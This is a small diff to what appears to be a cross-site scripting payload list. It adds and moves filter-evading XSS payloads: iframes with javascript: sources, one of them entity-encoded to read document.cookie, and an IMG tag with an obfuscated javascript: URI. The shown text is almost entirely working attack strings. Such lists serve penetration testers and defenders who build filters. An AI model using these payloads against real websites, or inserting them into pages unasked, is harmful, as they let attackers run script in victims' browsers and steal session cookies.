@@ -34,6 +34,8 @@ An attacker can use XSS to send a malicious script to an unsuspecting user. The 
 <!--        Medium : https://medium.com/@ismailtasdelen -->
 
 
+
 <IFRAME SRC="javascript:alert('window.origin');"></IFRAME>
-<iframe src=javascript&colon;alert&lpar;document&period;cookie&rpar;>
 <IMG SRC=" &#14;  javascript:alert('XSS');">
+<iframe src=javascript&colon;alert&lpar;document&period;cookie&rpar;>
+
